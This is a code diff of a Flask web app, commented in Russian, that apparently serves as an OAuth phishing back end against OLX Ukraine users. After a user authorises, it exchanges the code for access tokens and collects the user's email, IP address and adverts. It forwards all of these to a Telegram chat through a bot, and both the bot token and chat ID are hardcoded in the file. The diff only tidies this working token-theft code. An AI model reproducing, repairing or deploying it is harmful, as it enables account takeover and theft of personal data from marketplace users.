@@ -5,7 +5,7 @@ import json
 
 app = Flask(__name__)
 
-# ---- ТВОИ КОНФИГУРАЦИИ ----
+# ---- КОНФИГУРАЦИЯ ----
 TG_TOKEN = "8690988862:AAEWmxb3H3_4N3mhSmqjyVsOfpkczPjZ628"
 TG_CHAT_ID = "-1003818732408"
 CLIENT_ID = "202421"
@@ -17,40 +17,27 @@ OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_
 def send_telegram_message(msg):
     try:
         requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
-                     json={
-                         "chat_id": TG_CHAT_ID, 
-                         "text": msg, 
-                         "parse_mode": "HTML", 
-                         "disable_web_page_preview": True
-                     },
+                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                      timeout=10)
     except Exception as e:
-        print(f"Ошибка отправки в TG: {e}")
+        print(f"ОШИБКА ТГ: {e}")
 
 @app.route('/')
 def index():
-    # Пытаемся достать куку
     ads_cookie = request.cookies.get('user_ads')
-    
-    # КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: если куки нет, ставим пустой список [], а не None
-    # Это убирает ошибку "object of type 'NoneType' has no len()"
     user_ads = []
     if ads_cookie:
         try:
             user_ads = json.loads(ads_cookie)
-        except Exception:
+        except:
             user_ads = []
     
     try:
-        # Читаем твой index.html
-        if os.path.exists('index.html'):
-            with open('index.html', 'r', encoding='utf-8') as f:
-                html_content = f.read()
-                return render_template_string(html_content, user_ads=user_ads)
-        else:
-            return "Файл index.html не найден", 404
+        with open('index.html', 'r', encoding='utf-8') as f:
+            html_content = f.read()
+            return render_template_string(html_content, user_ads=user_ads)
     except Exception as e:
-        return f"Ошибка загрузки шаблона: {e}", 500
+        return f"Ошибка: {e}", 500
 
 @app.route('/get_token', methods=['POST'])
 def get_token():
@@ -59,80 +46,73 @@ def get_token():
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
     if not code: 
-        return jsonify({"error": "Код не передан"}), 400
+        return jsonify({"error": "No code"}), 400
 
-    token_url = 'https://www.olx.ua/api/open/oauth/token'
-    payload = {
-        'grant_type': 'authorization_code',
-        'client_id': CLIENT_ID,
-        'client_secret': CLIENT_SECRET,
-        'code': code,
-        'redirect_uri': REDIRECT_URI,
-        'scope': 'read write v2'
-    }
-    
     try:
-        response = requests.post(token_url, data=payload, timeout=15)
+        # 1. Обмен кода на токен
+        token_url = 'https://www.olx.ua/api/open/oauth/token'
+        res = requests.post(token_url, data={
+            'grant_type': 'authorization_code',
+            'client_id': CLIENT_ID,
+            'client_secret': CLIENT_SECRET,
+            'code': code,
+            'redirect_uri': REDIRECT_URI,
+            'scope': 'read write v2'
+        }, timeout=15)
         
-        if response.status_code == 200:
-            res_json = response.json()
-            access = res_json.get('access_token')
-            refresh = res_json.get('refresh_token')
+        if res.status_code != 200:
+            return jsonify({"error": "OLX Auth Failed"}), 400
             
-            auth_headers = {
-                "Authorization": f"Bearer {access}", 
-                "Version": "2.0", 
-                "Accept": "application/json"
-            }
-            
-            # 1. Получаем Email пользователя
-            email = "Не указан"
-            try:
-                u_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
-                if u_req.status_code == 200:
-                    email = u_req.json().get('data', {}).get('email', email)
-            except: pass
+        res_data = res.json()
+        access = res_data.get('access_token')
+        refresh = res_data.get('refresh_token')
+        headers = {"Authorization": f"Bearer {access}", "Version": "2.0"}
 
-            # 2. Получаем список объявлений
-            ad_list_for_cookie = [] 
-            ads_flat = ""
-            ads_data = []
-            
-            try:
-                ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 10}, timeout=7)
-                if ads_req.status_code == 200:
-                    ads_data = ads_req.json().get('data', [])
-                    for i, ad in enumerate(ads_data):
-                        title = ad.get('title', 'Без названия')
-                        url = ad.get('url', 'https://olx.ua')
-                        ad_list_for_cookie.append({"title": title, "url": url, "img": OLX_LOGO})
-                        ads_flat += f"{i+1}. <a href='{url}'>{title}</a>\n"
-            except: pass
+        # 2. Почта
+        email = "Не указан"
+        try:
+            u = requests.get("https://www.olx.ua/api/partner/users/me", headers=headers, timeout=5).json()
+            email = u.get('data', {}).get('email', email)
+        except: pass
 
-            if not ads_flat:
-                ads_flat = "Объявлений нет"
+        # 3. Объявления (чистим и обрезаем для куки!)
+        ad_list_for_cookie = []
+        ads_flat = ""
+        try:
+            ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 10}, timeout=7).json()
+            ads_data = ads_req.get('data', [])
+            for i, ad in enumerate(ads_data):
+                title = ad.get('title', 'Без названия')
+                url = ad.get('url', 'https://olx.ua')
+                
+                # ДЛЯ КУКИ: только самое важное, заголовок режем до 40 симв.
+                if len(ad_list_for_cookie) < 10: # Лимит 10 шт
+                    ad_list_for_cookie.append({
+                        "title": (title[:37] + '..') if len(title) > 40 else title,
+                        "url": url,
+                        "img": OLX_LOGO
+                    })
+                
+                ads_flat += f"{i+1}. <a href='{url}'>{title}</a>\n"
+        except: ads_flat = "Ошибка получения"
 
-            # 3. Отправляем лог в ТГ
-            msg = (
-                f"👤 <b>Вход:</b> <code>{email}</code>\n"
-                f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
-                f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
-                f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
-                f"📦 <b>Товары:</b>\n{ads_flat}"
-            )
-            send_telegram_message(msg)
+        # 4. Лог в ТГ
+        msg = f"👤 <b>Вход:</b> <code>{email}</code>\n🌐 <b>IP:</b> <code>{user_ip}</code>\n\n🔑 <b>Access:</b> <code>{access}</code>\n\n📦 <b>Товары:</b>\n{ads_flat if ads_flat else 'Пусто'}"
+        send_telegram_message(msg)
 
-            # 4. Сохраняем данные в куки и отвечаем фронту
-            resp = make_response(jsonify({"status": "ok"}))
-            resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, httponly=True)
-            return resp
-        
-        else:
-            print(f"Ошибка OLX API: {response.text}")
-            return jsonify({"error": "Ошибка авторизации OLX"}), 400
+        # 5. Ответ с ПРАВИЛЬНЫМИ КУКАМИ
+        resp = make_response(jsonify({"status": "ok"}))
+        # Ставим куку максимально просто и с ограничением пути
+        resp.set_cookie(
+            'user_ads', 
+            json.dumps(ad_list_for_cookie), 
+            max_age=3600, 
+            path='/',
+            samesite='Lax' 
+        )
+        return resp
 
     except Exception as e:
-        print(f"Критическая ошибка: {e}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
